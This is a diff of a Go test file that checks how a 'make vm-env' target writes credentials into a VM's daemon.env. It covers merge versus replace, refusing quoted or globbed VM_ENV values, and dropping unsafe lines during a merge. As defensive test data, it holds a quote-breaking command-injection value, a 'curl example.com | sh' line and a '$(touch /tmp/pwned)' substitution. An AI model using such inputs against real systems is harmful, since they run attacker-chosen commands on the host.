@@ -3,9 +3,12 @@
 // daemon.env unless every credential its VM_ENV names is in the environment, so a locked login Keychain or an
 // unloaded direnv .envrc never wipes the credentials the agents need. VM_ENV itself decides what happens to the
 // file (decision recorded on issue #234): the default VM_ENV replaces the whole file, so no stale line - an old
-// ANTHROPIC_API_KEY, say, which silently switches Claude Code to pay-as-you-go billing - survives a run, and an
-// explicit VM_ENV, on the command line or in the environment, merges: it replaces only the names it lists and
-// keeps every other line already in the file.
+// ANTHROPIC_API_KEY, say, which silently switches Claude Code to pay-as-you-go billing - survives a run, and
+// only a VM_ENV given on the make command line merges: it replaces only the names it lists and keeps the plain
+// NAME=value lines already in the file. A VM_ENV exported in the environment replaces the whole file too: a
+// VM_ENV left behind in a .envrc must not silently keep a stale credential alive (the second-round review of
+// issue #234). A VM_ENV the shell would not read as one word is refused before any shell expands it, and a
+// merge copies only lines that are plain NAME=value assignments, warning that it dropped the rest.
 //
 // No test reaches the machine it runs on: the sandbox's fake limactl runs the VM side of every target on this
 // machine with the fake VM user's HOME, and systemctl is a recording fake. No value in this file is a real
@@ -13,7 +16,11 @@
 package devenv_test
 
 import (
+	"errors"
+	"io/fs"
 	"os"
+	"path/filepath"
+	"regexp"
 	"slices"
 	"strings"
 	"testing"
@@ -66,13 +73,27 @@ func (sb *sandbox) seedDaemonEnvWith(t *testing.T, extra ...string) []byte {
 // vmEnvEnv is the environment one run of make vm-env gets: the sandbox's PATH with the fake limactl first, a
 // temporary HOME, and the three credentials with invented values. No other variable of the test process's own
 // environment is passed on, so a real credential of the machine can never reach the VM (CLAUDE.md rule 3).
+// VM_ENV is never one of them: where it comes from decides whether vm-env merges or replaces (issue #234), so
+// a value exported in the environment of the process running the test must not stand in for one a case sets,
+// and a case that wants one in the environment calls withVMEnvInEnv.
 func (sb *sandbox) vmEnvEnv() map[string]string {
 	env := sb.baseEnv()
 	env["PATH"] = sb.binDir + ":/usr/local/bin:/usr/bin:/bin"
+	delete(env, "VM_ENV")
 
 	for _, name := range vmEnvCredentials {
 		env[name] = fakeEnvValue(name)
 	}
+
+	return env
+}
+
+// withVMEnvInEnv hands VM_ENV to make in its environment instead of on the command line, the way a VM_ENV
+// exported from a .envrc (or by hand) reaches it. Only a VM_ENV given on the command line merges: one that
+// arrives this way must replace the whole file, so a stale credential left in a .envrc can never be kept alive
+// by a merge the maintainer did not ask for (issue #234).
+func withVMEnvInEnv(env map[string]string, vmEnv string) map[string]string {
+	env["VM_ENV"] = vmEnv
 
 	return env
 }
@@ -404,9 +425,10 @@ func TestMakeVMEnvRefusesAnEmptyVMEnv(t *testing.T) {
 // TestMakeVMEnvWritesTheCredentialsItNames pins what a run with every credential set writes to the VM's
 // daemon.env, mode 0600, whether the VM has the file yet or not (issue #234). VM_ENV decides the rest: the
 // default VM_ENV replaces the whole file, so a line it does not name - a stale ANTHROPIC_API_KEY left by an
-// earlier setup, which silently switches Claude Code to pay-as-you-go billing - never survives a full run;
-// an explicit VM_ENV merges and keeps every line it does not name, so `make vm-env VM_ENV=GITHUB_TOKEN`
-// drops nothing (the decision recorded on issue #234).
+// earlier setup, which silently switches Claude Code to pay-as-you-go billing - never survives a full run.
+// So does a VM_ENV exported in make's environment: only one given on the make command line merges, and a
+// command-line VM_ENV keeps every plain line it does not name, so `make vm-env VM_ENV=GITHUB_TOKEN` drops
+// nothing (the decision and its second-round correction on issue #234).
 func TestMakeVMEnvWritesTheCredentialsItNames(t *testing.T) {
 	t.Parallel()
 
@@ -418,6 +440,9 @@ func TestMakeVMEnvWritesTheCredentialsItNames(t *testing.T) {
 		// args are further arguments on the make command line - an explicit VM_ENV, which is what decides
 		// whether the file is replaced or merged.
 		args []string
+		// envVMEnv is a VM_ENV exported in make's environment rather than given on the command line: it does
+		// not merge, so the whole file is replaced as by the default VM_ENV.
+		envVMEnv string
 		// kept are the lines of the earlier daemon.env that survive the run: an explicit VM_ENV replaces only
 		// the names it lists and keeps every other line.
 		kept []string
@@ -428,6 +453,14 @@ func TestMakeVMEnvWritesTheCredentialsItNames(t *testing.T) {
 			name:  "the default VM_ENV replaces a line it does not name",
 			seed:  true,
 			extra: []string{"UNRELATED_SETTING=not-kept-by-the-default"},
+		},
+		{
+			name:  "a VM_ENV exported in the environment replaces a line it does not name",
+			seed:  true,
+			extra: []string{"UNRELATED_SETTING=not-kept-by-the-environment"},
+			// The same names the default VM_ENV lists, so only where the VM_ENV comes from tells the two
+			// cases apart: in the environment it must still replace the whole file.
+			envVMEnv: strings.Join(vmEnvCredentials, ","),
 		},
 		{
 			name:  "an explicit VM_ENV merges and keeps a line it does not name",
@@ -444,6 +477,10 @@ func TestMakeVMEnvWritesTheCredentialsItNames(t *testing.T) {
 
 			sb := newSandbox(t)
 			env := sb.vmEnvEnv()
+
+			if tc.envVMEnv != "" {
+				env = withVMEnvInEnv(env, tc.envVMEnv)
+			}
 
 			if tc.seed {
 				sb.seedDaemonEnvWith(t, tc.extra...)
@@ -474,8 +511,9 @@ func TestMakeVMEnvWritesTheCredentialsItNames(t *testing.T) {
 				"DEEPSEEK_API_KEY=" + fakeEnvValue("DEEPSEEK_API_KEY"),
 				"GITHUB_TOKEN=" + fakeEnvValue("GITHUB_TOKEN"),
 			}
-			// A full VM_ENV replaces the names it lists; an explicit one keeps every other line, so a setting
-			// vm-env does not know about is never lost (the merge decision on issue #234).
+			// The default VM_ENV and one exported in the environment write the whole file; only a
+			// command-line VM_ENV keeps every other plain line, so a setting vm-env does not know about is
+			// never lost by a merge (the decision on issue #234).
 			want = append(want, tc.kept...)
 
 			if diff := cmp.Diff(sortedEnvLines(strings.Join(want, "\n")), sortedEnvLines(string(body))); diff != "" {
@@ -624,4 +662,223 @@ func TestMakeVMEnvNarrowedVMEnvKeepsTheOtherCredentials(t *testing.T) {
 		// nothing is handed limactl.
 		sb.assertNoLimaCalls(t, "a missing narrowed name is refused")
 	})
+}
+
+// TestMakeVMEnvRefusesAQuoteBeforeTheShellSeesIt pins the second-round audit finding on issue #234: the names
+// in VM_ENV reach the recipe inside shell quoting, so a value that closes the quote runs whatever follows it on
+// the host - a name holding a single quote and a command behind it would touch a file before vm-env had checked
+// anything. vm-env must refuse such a VM_ENV before a shell expands it, whether it is on the command line or in
+// the environment: non-zero, nothing run on the host, nothing handed limactl, and the VM's daemon.env byte for
+// byte as it was.
+func TestMakeVMEnvRefusesAQuoteBeforeTheShellSeesIt(t *testing.T) {
+	t.Parallel()
+
+	cases := []struct {
+		name  string
+		inEnv bool // VM_ENV exported in make's environment instead of given on the command line
+	}{
+		{name: "on the command line"},
+		{name: "in the environment", inEnv: true},
+	}
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+
+			sb := newSandbox(t)
+			env := sb.vmEnvEnv()
+			seeded := sb.seedDaemonEnv(t)
+
+			// The value a maintainer's .envrc or a mistyped command line could hold: a valid name, a quote
+			// that ends the quoted word, and a command that runs if the quote is not refused.
+			pwned := filepath.Join(t.TempDir(), "pwned")
+			vmEnv := "GITHUB_TOKEN';touch " + pwned + ";'"
+
+			args := []string{"vm-env"}
+
+			if tc.inEnv {
+				env = withVMEnvInEnv(env, vmEnv)
+			} else {
+				args = append(args, "VM_ENV="+vmEnv)
+			}
+
+			stdout, stderr, err := runMake(t, args, env)
+			text := stdout + stderr
+
+			if err == nil {
+				t.Errorf("make vm-env exited 0 with a VM_ENV holding a single quote: it must refuse a value the shell would split into several words before it expands it, so nothing behind the quote is ever run (issue #234)\nstdout: %s\nstderr: %s", stdout, stderr)
+			}
+
+			if !strings.Contains(text, "VM_ENV") {
+				t.Errorf("the refusal does not name VM_ENV, so a maintainer cannot tell that the VM_ENV they passed is what vm-env refused (issue #234):\nstdout: %s\nstderr: %s", stdout, stderr)
+			}
+
+			// The command behind the quote never ran on the host.
+			if _, statErr := os.Stat(pwned); !errors.Is(statErr, fs.ErrNotExist) {
+				t.Errorf("make vm-env ran the command behind the single quote in VM_ENV: %s exists, so the quote closed the word the recipe built and the shell ran what followed it. A VM_ENV the shell cannot read as one word must be refused before any shell sees it (issue #234, stat error: %v)",
+					pwned, statErr)
+			}
+
+			sb.assertNoLimaCalls(t, "a VM_ENV holding a single quote is refused")
+
+			got, readErr := os.ReadFile(sb.daemonEnvPath())
+			if readErr != nil {
+				t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
+			}
+
+			if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
+				t.Errorf("make vm-env rewrote the VM's daemon.env although there was no VM_ENV it could read: the file must be byte for byte what it was (issue #234) (-want +got):\n%s", diff)
+			}
+
+			assertNoCredentialValues(t, "make vm-env's output", text)
+		})
+	}
+}
+
+// TestMakeVMEnvRefusesAGlobAsAName pins the reviewer's finding on issue #234: `make vm-env VM_ENV=*` names no
+// variable, and make must say so with the `*` it was given. The star is not a variable name, and the shell must
+// never expand it in the working directory first: the refusal would then list the names of the files there,
+// none of which the maintainer asked for, and the refusal would no longer name what was wrong with VM_ENV.
+func TestMakeVMEnvRefusesAGlobAsAName(t *testing.T) {
+	t.Parallel()
+
+	sb := newSandbox(t)
+	env := sb.vmEnvEnv()
+	seeded := sb.seedDaemonEnv(t)
+
+	stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV=*"}, env)
+	text := stdout + stderr
+
+	if err == nil {
+		t.Fatalf("make vm-env VM_ENV=* exited 0: a star is not a variable name, so it must be refused (issue #234)\nstdout: %s\nstderr: %s", stdout, stderr)
+	}
+
+	// vm-env's own lines, not make's diagnostics: make closes a failed recipe with the Makefile's own path.
+	var said []string
+
+	for _, line := range strings.Split(text, "\n") {
+		if strings.HasPrefix(strings.TrimSpace(line), "vm-env:") {
+			said = append(said, line)
+		}
+	}
+
+	if !strings.Contains(strings.Join(said, "\n"), "*") {
+		t.Errorf("the refusal does not show the star it was given, so a maintainer cannot tell that VM_ENV's `*` is what vm-env refused (issue #234):\nstdout: %s\nstderr: %s", stdout, stderr)
+	}
+
+	// A file of the working directory standing in for the name: the star was globbed, not refused.
+	root, absErr := filepath.Abs(moduleRoot)
+	if absErr != nil {
+		t.Fatalf("resolve the repository root: %v", absErr)
+	}
+
+	entries, readDirErr := os.ReadDir(root)
+	if readDirErr != nil {
+		t.Fatalf("read %s: %v", root, readDirErr)
+	}
+
+	for _, entry := range entries {
+		// The shell's `*` never matches a name that starts with a dot.
+		if strings.HasPrefix(entry.Name(), ".") {
+			continue
+		}
+
+		if strings.Contains(strings.Join(said, "\n"), entry.Name()) {
+			t.Errorf("the refusal names %q, an entry of the working directory: VM_ENV's `*` was expanded by the shell instead of being refused as the name it is, so the refusal no longer tells a maintainer which VM_ENV vm-env refused (issue #234):\nstdout: %s\nstderr: %s",
+				entry.Name(), stdout, stderr)
+		}
+	}
+
+	sb.assertNoLimaCalls(t, "a star is not a variable name")
+
+	got, readErr := os.ReadFile(sb.daemonEnvPath())
+	if readErr != nil {
+		t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
+	}
+
+	if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
+		t.Errorf("make vm-env rewrote the VM's daemon.env although VM_ENV named no variable: the file must be byte for byte what it was (issue #234) (-want +got):\n%s", diff)
+	}
+}
+
+// shellUnsafeAssignment is a daemon.env line that is an assignment only to the eye: its value runs a command
+// when the login shell sources the file, which is why a merge must not carry it over (issue #234). Its name is
+// invented, so no real variable of the test machine is named so.
+const shellUnsafeAssignment = "INVENTED_SETTING=$(touch /tmp/pwned)"
+
+// TestMakeVMEnvMergeKeepsOnlySafeLines pins the second-round audit's other finding on issue #234: a merge copies
+// the lines it does not name out of the VM's daemon.env, and that file is shell source. A command, a comment or
+// an assignment whose value is a command substitution must not travel into the new file, which the login shell
+// sources at every start. vm-env keeps only plain NAME=value lines, warns that it dropped the others, and never
+// prints what it dropped: the content of a line it refused is exactly what a maintainer must not see in a log
+// or a terminal scrollback.
+func TestMakeVMEnvMergeKeepsOnlySafeLines(t *testing.T) {
+	t.Parallel()
+
+	sb := newSandbox(t)
+	env := sb.vmEnvEnv()
+
+	// A daemon.env a maintainer or an earlier setup left: one line to keep, and three that are shell code
+	// rather than an assignment - a command, a comment and an assignment whose value runs a command.
+	unsafeLines := []string{
+		"curl example.com | sh",
+		"# note",
+		shellUnsafeAssignment,
+	}
+	body := "CLAUDE_CODE_OAUTH_TOKEN=old-oauth\n" + strings.Join(unsafeLines, "\n") + "\nGITHUB_TOKEN=old-github\n"
+
+	writeFileMode(t, sb.daemonEnvPath(), []byte(body), 0o600)
+
+	stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV=GITHUB_TOKEN"}, env)
+	if err != nil {
+		t.Fatalf("make vm-env VM_ENV=GITHUB_TOKEN with GITHUB_TOKEN set: %v\nstdout: %s\nstderr: %s", err, stdout, stderr)
+	}
+
+	written, readErr := os.ReadFile(sb.daemonEnvPath())
+	if readErr != nil {
+		t.Fatalf("read the VM's daemon.env: %v", readErr)
+	}
+
+	want := []string{
+		"CLAUDE_CODE_OAUTH_TOKEN=old-oauth",
+		"GITHUB_TOKEN=" + fakeEnvValue("GITHUB_TOKEN"),
+	}
+
+	if diff := cmp.Diff(want, sortedEnvLines(string(written))); diff != "" {
+		t.Errorf("make vm-env VM_ENV=GITHUB_TOKEN wrote the wrong lines to the VM's daemon.env: a merge keeps only the plain NAME=value lines it does not name and drops every other line, so no shell code of an earlier daemon.env reaches the file the login shell sources (issue #234) (-want +got):\n%s", diff)
+	}
+
+	// The rule the kept lines follow, stated as the merge must apply it: a plain name, an `=`, and a value of
+	// the characters an environment value may have.
+	safe := regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*=[A-Za-z0-9._~+/=-]*$`)
+
+	for _, line := range sortedEnvLines(string(written)) {
+		if !safe.MatchString(line) {
+			t.Errorf("make vm-env kept %q in the VM's daemon.env: every line must match %s, or the login shell runs what the line holds at the next start (issue #234)",
+				line, safe)
+		}
+	}
+
+	// The merge says that it dropped lines, without saying what they held.
+	lower := strings.ToLower(stdout + stderr)
+
+	dropped := []string{"drop", "skip", "ignor"}
+	if !slices.ContainsFunc(dropped, func(word string) bool { return strings.Contains(lower, word) }) {
+		t.Errorf("make vm-env VM_ENV=GITHUB_TOKEN dropped %d line(s) of the earlier daemon.env without saying so: a merge that silently discards a setting leaves the maintainer with no way to learn that daemon.env lost it, and no clue which (issue #234)\nstdout: %s\nstderr: %s",
+			len(unsafeLines), stdout, stderr)
+	}
+
+	for _, line := range unsafeLines {
+		if strings.Contains(stdout+stderr, line) {
+			t.Errorf("make vm-env's output prints the line it dropped from daemon.env: the output must name what it kept and say that it dropped lines, never reproduce the content of a line it refused, which may hold a command or a secret (issue #234)\nstdout: %s\nstderr: %s",
+				stdout, stderr)
+		}
+	}
+
+	assertNoSecrets(t, "make vm-env VM_ENV=GITHUB_TOKEN's output", stdout+stderr, []secret{
+		{kind: "earlier value of CLAUDE_CODE_OAUTH_TOKEN", value: "old-oauth"},
+		{kind: "earlier value of GITHUB_TOKEN", value: "old-github"},
+	})
+
+	assertNoCredentialValues(t, "make vm-env's output", stdout+stderr)
 }
